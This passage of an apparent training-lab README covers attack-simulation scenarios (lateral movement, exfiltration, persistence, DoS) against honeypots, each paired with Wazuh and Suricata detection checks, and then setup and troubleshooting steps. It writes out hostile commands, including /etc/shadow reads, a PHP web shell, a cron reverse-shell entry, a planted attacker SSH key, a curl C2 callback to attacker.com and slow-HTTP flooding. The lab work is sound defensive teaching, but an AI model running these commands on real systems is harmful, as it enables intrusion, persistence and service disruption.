  /var/ossec/logs/alerts/alerts.json | jq -r '.rule.description' | tail -10
```

---

### Scenario 4: Lateral Movement Simulation

**Objective:** Simulate post-breach lateral movement detection

**Step 1: Initial Breach (Simulate Compromised Service)**

```bash
# SSH into honeypot (simulating successful breach)
sshpass -p "honeypot" ssh -o StrictHostKeyChecking=no cowrie@10.10.20.70 -p 2222 << 'EOF'
# Now simulate lateral movement commands
whoami
id
ifconfig
cat /etc/passwd
EOF
```

**Step 2: Reconnaissance from Compromised Host**

```bash
# Scan for other services
ssh -o StrictHostKeyChecking=no cowrie@10.10.20.70 -p 2222 << 'EOF'
# Internal network scan
for ip in 10.10.20.{1..254}; do
  timeout 0.1 bash -c "</dev/tcp/$ip/22" 2>/dev/null && echo "$ip:22 open" &
done
wait
EOF
```

**Step 3: Attempt to Reach Other Systems**

```bash
# Try to access other honeypots
ssh -o StrictHostKeyChecking=no cowrie@10.10.20.70 -p 2222 << 'EOF'
# Attempt to connect to Dionaea
ftp 10.10.20.71
# Attempt to connect to MySQL
mysql -h 10.10.20.71 -u root -p"" 2>&1
# Attempt to access shared resources
smbclient //10.10.20.71/share -N 2>&1
EOF
```

**Step 4: Verify Lateral Movement Detection**

```bash
# Check for lateral movement alerts
docker exec wazuh.manager grep -i "lateral\|propagation\|spreading" \
  /var/ossec/logs/alerts/alerts.json | \
  jq '{description: .rule.description, src: .data.srcip, dst: .data.dstip}'

# Check Suricata for internal traffic anomalies
docker exec suricata jq 'select(.dest_ip | contains("10.10"))' \
  /var/log/suricata/eve.json | head -5
```

---

### Scenario 5: Data Exfiltration Detection

**Objective:** Simulate and detect unauthorized data access

**Step 1: Database Query Anomaly**

```bash
# Generate suspicious database queries
docker exec postgresql psql -U postgres << EOF
SELECT * FROM information_schema.tables;
SELECT * FROM pg_users;
COPY (SELECT * FROM users) TO '/tmp/users_export.csv';
EOF

# Check Wazuh detection
docker exec wazuh.manager grep -i "exfiltr\|dump\|copy" \
  /var/ossec/logs/alerts/alerts.json
```

**Step 2: File Download from Honeypot**

```bash
# SSH and download files (simulated)
ssh -o StrictHostKeyChecking=no cowrie@10.10.20.70 -p 2222 << 'EOF'
cat /etc/passwd
cat /etc/shadow
df -h
EOF

# Check Cowrie logs for file access
docker exec cowrie jq 'select(.eventid=="cowrie.command.input") | select(.input | contains("cat"))' \
  /var/log/cowrie/cowrie.json
```

**Step 3: Network Exfiltration Patterns**

```bash
# Generate suspicious outbound traffic (simulated)
# In real scenario, would be detected by:
# - Large volume of data transfer
# - Connection to suspicious external IP
# - Data compression before transfer
# - Use of non-standard ports

# Check Suricata for data exfiltration signatures
docker exec suricata jq 'select(.alert.signature | contains("exfiltrat"))' \
  /var/log/suricata/eve.json
```

**Step 4: Verify Data Exfiltration Alerts**

```bash
docker exec wazuh.manager grep -i "exfiltr\|data.loss\|unauthorized.access" \
  /var/ossec/logs/alerts/alerts.json | \
  jq '{rule: .rule.description, severity: .rule.level, timestamp: .timestamp}'
```

---

### Scenario 6: Persistence Mechanism Detection

**Objective:** Test detection of backdoor installation and persistence

**Step 1: Simulate Backdoor Installation**

```bash
# SSH into honeypot and install backdoor (simulated)
ssh -o StrictHostKeyChecking=no cowrie@10.10.20.70 -p 2222 << 'EOF'
# Create suspicious cron job
echo "* * * * * /tmp/reverse_shell.sh" | crontab -

# Create persistence script
cat > ~/.ssh/authorized_keys << 'KEYS'
ssh-rsa AAAA... attacker@evil
KEYS

# Create web shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/shell.php
EOF
```

**Step 2: Verify Persistence Detection**

```bash
# Check Cowrie logs for file creation
docker exec cowrie jq 'select(.eventid=="cowrie.file.write")' \
  /var/log/cowrie/cowrie.json | \
  jq '{filename: .file.name, size: .file.size}'

# Check Wazuh for backdoor signatures
docker exec wazuh.manager grep -i "backdoor\|persistence\|web.shell" \
  /var/ossec/logs/alerts/alerts.json
```

**Step 3: Monitor for Outbound Callback**

```bash
# Simulate C2 callback attempt
curl -s "http://attacker.com:8080/checkin?id=pwned" 2>/dev/null || true

# Check Suricata for C2 patterns
docker exec suricata jq 'select(.alert.signature | contains("C2|beacon"))' \
  /var/log/suricata/eve.json
```

---

### Scenario 7: Denial of Service (DoS) Detection

**Objective:** Test DoS/DDoS detection capabilities

**Step 1: Slow HTTP DoS**

```bash
# Send slow, incomplete HTTP requests
for i in {1..10}; do
  timeout 30 bash -c 'exec 3<>/dev/tcp/10.10.20.80/80; \
    echo -ne "GET / HTTP/1.1\r\nHost: 10.10.20.80\r\n"; \
    sleep 15; \
    echo -ne "\r\n"' &
done
wait
```

**Step 2: Volumetric Attack Simulation**

```bash
# Generate high-volume traffic (use with caution!)
# Using ApacheBench (ab) - moderate load
ab -n 1000 -c 50 http://10.10.20.80/ 2>/dev/null

# Or using hping3 for SYN flood simulation (if available)
# sudo hping3 -S -p 80 --flood 10.10.20.80 &
# sleep 5
# kill %1
```

**Step 3: DNS DoS Simulation**

```bash
# Send multiple DNS queries rapidly
for i in {1..100}; do
  dig @10.10.30.101 cyberlab.local +short > /dev/null &
done
wait
```

**Step 4: Verify DoS Detection**

```bash
# Check for DoS alerts in Wazuh
docker exec wazuh.manager grep -i "dos\|ddos\|flood" \
  /var/ossec/logs/alerts/alerts.json | \
  jq '{rule: .rule.description, rate: .data.rate}'

# Check Suricata for anomalies
docker exec suricata jq 'select(.event_type=="stats")' \
  /var/log/suricata/stats.json | \
  tail -1 | jq '.stats | {pkts, bytes}'
```

---

## Complete Testing Checklist

Use this checklist to verify all components are functioning:

```
┌─ SERVICE HEALTH
├─ [ ] All 20 containers running: docker compose ps
├─ [ ] No service in "unhealthy" state
├─ [ ] All ports accessible
└─ [ ] Logs generating without errors

┌─ WAZUH SIEM
├─ [ ] Wazuh Manager operational
├─ [ ] Wazuh Dashboard accessible
├─ [ ] 400+ custom rules loaded
├─ [ ] Alerts flowing from all services
└─ [ ] Honeypot logs ingested

┌─ SURICATA IDS/IPS
├─ [ ] Suricata running on host network
├─ [ ] 400+ rules loaded and validated
├─ [ ] EVE JSON output generated
├─ [ ] Alerts triggering on test traffic
└─ [ ] Stats updating in real-time

┌─ HONEYPOTS
├─ [ ] Cowrie responding on SSH (2222) and Telnet (2223)
├─ [ ] Dionaea responding on FTP (21), SMB (445), etc.
├─ [ ] Juice Shop accessible on port 3000
├─ [ ] WebGoat accessible on port 8080
├─ [ ] All generating JSON logs
└─ [ ] Attacks captured and correlated

┌─ NETWORK & ACCESS
├─ [ ] DNS resolving all hostnames
├─ [ ] Traefik routing working
├─ [ ] Access policies enforced
├─ [ ] LDAP authentication working
└─ [ ] VPN access available

┌─ INTEGRATION TESTS
├─ [ ] Attack simulation scripts running successfully
├─ [ ] Multi-stage attacks detected
├─ [ ] Alerts correlating properly
├─ [ ] No false negatives on known attacks
└─ [ ] Response times acceptable

┌─ ADVANCED SCENARIOS
├─ [ ] Reconnaissance detected
├─ [ ] Brute force detection working
├─ [ ] SQL injection signatures firing
├─ [ ] XSS/RFI/LFI detection active
├─ [ ] Protocol-level exploits detected
├─ [ ] Lateral movement identified
├─ [ ] Data exfiltration alerts
└─ [ ] DoS/DDoS patterns recognized
```

---

## Accessing Services

### Web Interface URLs

Access these services in your browser (requires `/etc/hosts` configuration):

| Service               | URL                               | Username                      | Password       |
| --------------------- | --------------------------------- | ----------------------------- | -------------- |
| **Traefik Dashboard** | https://traefik.cyberlab.local    | —                             | —              |
| **Wazuh Dashboard**   | https://wazuh.cyberlab.local      | kibanaserver                  | kibanaserver   |
| **NeuVector**         | https://neuvector.cyberlab.local  | admin                         | admin          |
| **OpenVPN Admin**     | https://vpn.cyberlab.local        | openvpn                       | (from secrets) |
| **LDAP Admin**        | https://ldap.cyberlab.local       | cn=admin,dc=cyberlab,dc=local | admin          |
| **DNS Console**       | http://dns.cyberlab.local:5380    | admin                         | admin          |
| **Rocket.Chat**       | https://rocketchat.cyberlab.local | (first login)                 | (first login)  |
| **Workstation VNC**   | http://localhost:6080             | —                             | —              |

### Command-Line Access

**Execute commands in containers:**

```bash
# General syntax
docker exec <container_name> <command>

# Examples:
docker exec openldap ldapsearch -b "dc=cyberlab,dc=local" -x
docker exec postgresql psql -U postgres -c "\l"
docker exec traefik traefik version
```

**Interactive shell:**

```bash
docker exec -it <container_name> /bin/bash
# or
docker exec -it <container_name> /bin/sh
```

### Port Mappings (Host Access)

Some services expose ports directly to the host:

| Service           | Port          | Purpose                   |
| ----------------- | ------------- | ------------------------- |
| Traefik           | 80, 443       | HTTP/HTTPS (all services) |
| Traefik Dashboard | 8082          | Infrastructure management |
| Suricata          | Host network  | Network capture & IDS     |
| NeuVector         | 8443          | Container security UI     |
| OpenVPN           | 943, 1194/UDP | VPN server                |
| Workstation VNC   | 5900, 6080    | Remote desktop            |

---

## Configuration

### Key Configuration Files

```
infra/
├── docker-compose.yml         # Complete service definitions
├── .env                        # Environment variables (create from .env.template)
│
├── configs/
│   ├── traefik/
│   │   ├── traefik.yml         # Traefik main config
│   │   └── dynamic.yml         # Service routing & access policies
│   │
│   ├── wazuh/
│   │   ├── wazuh_manager.conf  # Wazuh SIEM configuration
│   │   ├── opensearch_dashboards.yml
│   │   └── *_ssl_certs/        # SSL certificates
│   │
│   ├── suricata/
│   │   ├── suricata.yaml       # IDS/IPS configuration
│   │   └── suricata-rules.rules # 300+ detection rules
│   │
│   ├── nginx/
│   │   └── nginx.conf          # Web server configuration
│   │
│   └── ldap/
│       └── ldif/               # LDAP schema definitions
│
├── scripts/
│   ├── test-dns.sh
│   ├── test-dns-advanced.py
│   ├── seed-ldap.sh
│   ├── init-openvpn.sh
│   ├── init-dns-tools.sh
│   ├── generate-passwords.sh
│   └── verify-network-access.sh
│
└── volumes/                    # Persistent data (auto-created)
    ├── wazuh_*
    ├── ldap_*
    ├── postgres_*
    ├── mongodb_*
    └── ...
```

### Modifying Configuration

**To change service parameters:**

1. Edit `infra/.env`:

   ```bash
   nano infra/.env
   ```

2. Edit relevant config file in `infra/configs/`:

   ```bash
   nano infra/configs/traefik/dynamic.yml
   ```

3. Restart affected services:

   ```bash
   docker-compose restart <service_name>
   ```

4. Verify changes:
   ```bash
   docker logs -f <service_name>
   ```

### Enabling/Disabling Services

To disable a service, comment it out in `docker-compose.yml`:

```yaml
# openvpn:
#   image: openvpn/openvpn-as:latest
#   ...
```

Then restart:

```bash
docker-compose up -d
```

---

## Security Policies

### Network Access Control

Traefik enforces strict IP-based whitelisting for all services using 5 access policies:

#### 1. Admin-Only Access

- **Allowed Networks:** Management (10.10.40.0/24) + Security (10.10.30.0/24)
- **Services:** Traefik Dashboard, OpenVPN Admin, DNS Console

#### 2. Security Network Access

- **Allowed Networks:** Security (10.10.30.0/24) + Management (10.10.40.0/24)
- **Services:** Wazuh Dashboard, Wazuh API, NeuVector Console, Suricata Manager

#### 3. Internal Network Access

- **Allowed Networks:** Internal (10.10.20.0/24) + Security (10.10.30.0/24) + Management (10.10.40.0/24)
- **Services:** LDAP, phpLDAPadmin, Rocket.Chat, Workstation

#### 4. Public Services Access

- **Allowed Networks:** All networks (10.10.0.0/24 - 10.10.40.0/24)
- **Services:** Nginx Web Server, Public APIs

#### 5. Localhost Only

- **Allowed Networks:** 127.0.0.1/32 (Docker internal)
- **Services:** Internal monitoring endpoints

### Changing Default Credentials

⚠️ **IMPORTANT: Change default credentials immediately in production!**

```bash
# Edit .env file
nano infra/.env

# Change these variables:
LDAP_ADMIN_PASSWORD=MyNewSecurePassword123
POSTGRES_PASSWORD=MyPostgresPassword123
MONGODB_PASSWORD=MyMongoPassword123
OPENVPN_ADMIN_PASSWORD=MyVPNPassword123

# Restart services
docker-compose down
docker-compose up -d
```

### SSL/TLS Certificates

The infrastructure includes self-signed certificates for development. For production:

1. **Generate proper certificates:**

   ```bash
   # Using Let's Encrypt (if publicly accessible)
   certbot certonly --standalone -d cyberlab.local
   ```

2. **Update Traefik configuration:**

   ```bash
   nano infra/configs/traefik/traefik.yml
   ```

3. **Copy certificates to:**
   ```bash
   infra/certs/
   ```

---

## Troubleshooting

### Service Won't Start

**Check logs:**

```bash
docker-compose logs <service_name>
```

**Common issues:**

1. **Port already in use:**

   ```bash
   # Find what's using port
   lsof -i :80
   lsof -i :443

   # Kill process
   kill -9 <PID>
   ```

2. **Insufficient memory:**

   ```bash
   # Check Docker resources
   docker stats

   # Increase Docker memory limit
   # macOS: Docker Desktop > Preferences > Resources
   ```

3. **Volume mount errors:**

   ```bash
   # Check volumes
   docker volume ls

   # Inspect volume
   docker volume inspect <volume_name>
   ```

### Network Connectivity Issues

**Test DNS resolution:**

```bash
docker exec nginx nslookup wazuh.cyberlab.local
docker exec nginx nslookup google.com
```

**Test network connectivity:**

```bash
cd infra/scripts
./verify-network-access.sh
```

### Service Health Checks

**Check if service is healthy:**

```bash
docker-compose ps
```

Look for `(healthy)` or `(unhealthy)` status.

**Restart unhealthy service:**

```bash
docker-compose restart <service_name>
docker-compose logs -f <service_name>
```

### LDAP Connection Issues

```bash
# Test LDAP connectivity
docker exec nginx ldapsearch -h openldap -p 389 -x -b "dc=cyberlab,dc=local"

# Check LDAP status
docker exec openldap ldapwhoami -h 127.0.0.1 -D "cn=admin,dc=cyberlab,dc=local" -w admin
```

### Wazuh Login Issues

**Reset Wazuh credentials:**

```bash
# Connect to Wazuh manager
docker exec wazuh.manager /var/ossec/bin/wazuh-control status

# Reset admin password
docker exec wazuh.manager /var/ossec/bin/wazuh_user_admin.sh -u admin -p MyNewPassword123
```

### Disk Space Issues

**Check Docker disk usage:**

```bash
docker system df
```

**Clean up unused data:**

```bash
# Remove unused volumes
docker volume prune

# Remove unused images
docker image prune -a

# Remove unused containers
docker container prune
```

**Backup and clear logs:**

```bash
docker exec backup tar -czf /backups/old-logs.tar.gz /volumes/*/

# Truncate logs
docker exec <container> truncate -s 0 /var/log/app.log
```

---

## Documentation

### Architecture & Design

- **DEPLOYMENT_SUMMARY.md** - Complete deployment overview, service status, and commands
- **NETWORK_ACCESS_CONTROL.md** - Network policies and access control rules
- **SERVICE_ACCESS_MATRIX.md** - Quick reference for service accessibility
- **CONFIG_INVENTORY.md** - Configuration files inventory and recovery status

### Security & Implementation

- **SECURITY_ENHANCEMENTS_IMPLEMENTATION.md** - Security improvements documentation
- **TRAEFIK_SECURITY_UPDATE.md** - Traefik security hardening details
- **TRAEFIK_SERVICE_ROUTING.md** - Traefik routing configuration guide

### Integration & Recovery

- **LDAP_SERVICE_INTEGRATION_GUIDE.md** - LDAP setup and integration
- **LDAP_RECOVERY_GUIDE.md** - LDAP troubleshooting and recovery
- **SURICATA_OPENVPN_RECOVERY.md** - Suricata and OpenVPN recovery
- **NEUVECTOR_FIX.md** - NeuVector configuration fixes

### Testing & Configuration

- **DNS_TESTING_GUIDE.md** - DNS testing procedures and troubleshooting
- **DNS_HOSTS_CONFIG.md** - Host file configuration for domain access
- **DOCKER_COMPOSE_UPDATES.md** - Docker Compose changes documentation
- **CONFIGURATION_PERSISTENCE.md** - Volume and data persistence details
- **HOSTS_FILE_ENTRIES.txt** - Mac/Linux hosts file entries
- **RECOVERY_SUMMARY.md** - System recovery procedures

---

## Common Tasks

### Monitor Services in Real-Time

```bash
# Watch all services
watch -n 1 'docker-compose ps'

# Monitor resource usage
docker stats

# Follow logs
docker-compose logs -f --tail=50
```

### Back Up Configuration

```bash
# Backup all configs
tar -czf cyberlab-backup-$(date +%Y%m%d).tar.gz infra/

# Backup Docker volumes
docker exec backup tar -czf "/backups/volumes-$(date +%Y%m%d).tar.gz" /backup/
```

### Update Service Images

```bash
# Pull latest images
docker-compose pull

# Update and restart
docker-compose up -d --no-deps --build
```

### Reset Everything (WARNING: Deletes all data)

```bash
# Stop all services
docker-compose down

# Remove volumes (WARNING: Deletes all data!)
docker-compose down -v

# Start fresh
docker-compose up -d
```

### Export Service Configurations

```bash
# Export Wazuh configuration
docker cp wazuh.manager:/var/ossec/etc/ossec.conf ./wazuh-backup.conf

# Export Suricata rules
docker cp suricata:/etc/suricata/rules/ ./suricata-rules-backup/

# Export Traefik configuration
docker cp traefik:/etc/traefik/ ./traefik-backup/
```

---

## Performance Tuning

### Memory Optimization

Edit `docker-compose.yml` to set service memory limits:

```yaml
wazuh.manager:
  mem_limit: 2g
  memswap_limit: 2g

suricata:
  mem_limit: 1g
```

### CPU Optimization

```yaml
services:
  wazuh.manager:
    cpus: '2'
    cpuset: '0-1'
```

### Log Rotation

Prevent logs from consuming disk space:

```bash
# Enable log rotation
docker run --log-driver json-file --log-opt max-size=10m --log-opt max-file=3 ...
```

---

## Getting Help

### Documentation Links

- **Wazuh Documentation:** https://documentation.wazuh.com/
- **Suricata Documentation:** https://suricata.readthedocs.io/
- **NeuVector Documentation:** https://neuvector.com/docs/
- **Traefik Documentation:** https://doc.traefik.io/
- **OpenVPN Documentation:** https://openvpn.net/community-resources/

### Common Commands

```bash
# View all containers
docker ps -a

# View container details
docker inspect <container_name>

# View network details
docker network ls
docker network inspect <network_name>

# View volume details
docker volume ls
docker volume inspect <volume_name>

# Check Docker daemon logs (macOS)
log stream --predicate 'process == "dockerd"'
```

### Error Resources

Refer to the troubleshooting section and documentation files included in the project for detailed recovery procedures.

---

## Project Statistics

| Metric                  | Value                                                 |
| ----------------------- | ----------------------------------------------------- |
| **Total Services**      | 20 (+ 5 honeypots)                                    |
| **Network Segments**    | 5                                                     |
| **Detection Rules**     | 500+ (400 Suricata + 100 Wazuh)                       |
| **Suricata Coverage**   | Database, Web, Protocol, Malware, CVE, Infrastructure |
| **Alert Decoders**      | 50+ (custom honeypot + built-in)                      |
| **Configuration Lines** | 3,000+                                                |
| **Script Files**        | 17                                                    |
| **Attack Scenarios**    | 7 (with multi-stage testing)                          |
| **SSL Certificates**    | 12+                                                   |
| **Docker Volumes**      | 30+                                                   |
| **Backup Retention**    | 30 days                                               |
| **Memory (Running)**    | ~10-12GB                                              |
| **Storage (Volumes)**   | ~60GB (with data)                                     |
| **Honeypot Protocols**  | SSH, Telnet, FTP, SMB, MySQL, MSSQL, RDP, HTTP, HTTPS |
| **Training Platforms**  | OWASP Juice Shop, OWASP WebGoat                       |

---

## What's New in This Version

### 🆕 Enhanced Honeypot Coverage

- **Cowrie SSH/Telnet Honeypot** - Captures authentication attempts and command execution
- **Dionaea Multi-Protocol** - Detects exploitation across FTP, SMB, MSSQL, MySQL, RDP
- **OWASP Juice Shop** - Vulnerable e-commerce for web attack training
- **OWASP WebGoat** - Interactive web security lessons

### 🆕 Expanded Detection Rules

- **400+ Suricata IDS Rules** covering:

  - 50+ Database attack patterns
  - 75+ Web application vulnerabilities
  - 50+ Protocol-specific exploits
  - 30+ CVE-specific signatures
  - 40+ Malware and C2 patterns

- **100+ Wazuh SIEM Rules** for:
  - Honeypot correlation and detection
  - Web application attack analysis
  - Multi-stage attack detection
  - False positive reduction

### 🆕 Comprehensive Testing Suite

- 7 Automated attack simulation scripts
- End-to-end testing scenarios
- Real-time monitoring dashboards
- Integration validation tools
- Performance benchmarking

### 🆕 Training & Education

- Attack simulation environments
- Hands-on labs with real alerts
- Multi-stage attack documentation
- Detection and response walkthroughs

---

## License & Support

This project is designed for educational purposes in the CyberSecurity Diploma program at TAFE NSW.

For issues, questions, or improvements:

1. Check the documentation files in the project root
2. Review service-specific documentation in `infra/configs/`
3. Consult the troubleshooting guide in this README

---

## Quick Reference: Command Cheat Sheet

### Windows (PowerShell)

```powershell
# Startup & Management
cd infra; docker compose up -d              # Start all services
docker compose down                         # Stop all services
docker compose ps                           # Check status
docker compose logs -f <service>            # View logs

# Service Operations
docker exec <service> <command>             # Execute in container
docker compose restart <service>            # Restart service
docker compose pull; docker compose up -d   # Update services

# Scripts
cd infra\scripts
.\init-openvpn.ps1                          # Initialize OpenVPN (PowerShell)
bash ./seed-ldap.sh                         # Initialize LDAP (Bash)
bash ./verify-network-access.sh             # Test connectivity (Bash)
python test-dns-advanced.py --export json   # Advanced DNS testing

# Wazuh Certificates
cd infra\configs\wazuh
docker compose -f generate-indexer-certs.yml run --rm generator  # Generate certs
dir wazuh_indexer_ssl_certs                 # Verify certificates

# Troubleshooting
docker stats                                # Resource usage
docker volume ls                            # List volumes
docker network ls                           # List networks
docker logs <container>                     # View container logs

# Backup & Restore
docker exec backup ls /backups/             # List backups
docker exec backup tar -xzf /backups/file.tar.gz -C /backup/  # Restore

# Database Access
docker exec postgresql psql -U postgres -c "\l"             # List PG databases
docker exec mongodb mongosh -u root -p $env:MONGODB_PASSWORD  # Connect to MongoDB
docker exec openldap ldapsearch -b "dc=cyberlab,dc=local" -x  # LDAP search
```

### macOS/Linux (Bash)

```bash
# Startup & Management
cd infra && docker-compose up -d          # Start all services
docker-compose down                        # Stop all services
docker-compose ps                          # Check status
docker-compose logs -f <service>           # View logs

# Service Operations
docker exec <service> <command>            # Execute in container
docker-compose restart <service>           # Restart service
docker-compose pull && docker-compose up -d  # Update services

# Scripts
cd infra/scripts
./init-openvpn.sh                          # Initialize OpenVPN
./seed-ldap.sh                             # Initialize LDAP
./verify-network-access.sh                 # Test connectivity
python3 test-dns-advanced.py --export json # Advanced DNS testing

# Wazuh Certificates
cd infra/configs/wazuh
docker compose -f generate-indexer-certs.yml run --rm generator  # Generate certs
ls -la wazuh_indexer_ssl_certs/            # Verify certificates

# Troubleshooting
docker stats                               # Resource usage
docker volume ls                           # List volumes
docker network ls                          # List networks
docker logs <container>                    # View container logs

# Backup & Restore
docker exec backup ls /backups/            # List backups
docker exec backup tar -xzf /backups/file.tar.gz -C /backup/  # Restore

# Database Access
docker exec postgresql psql -U postgres -c "\l"  # List PG databases
docker exec mongodb mongosh -u root -p $PASS    # Connect to MongoDB
docker exec openldap ldapsearch -b "dc=cyberlab,dc=local" -x  # LDAP search
```

---

**Last Updated:** November 25, 2025
**Status:** ✅ Fully Operational
**Platform:** Windows/macOS/Linux with Docker Desktop

For detailed information on specific services, configuration, and recovery procedures, refer to the additional documentation files included in the project.
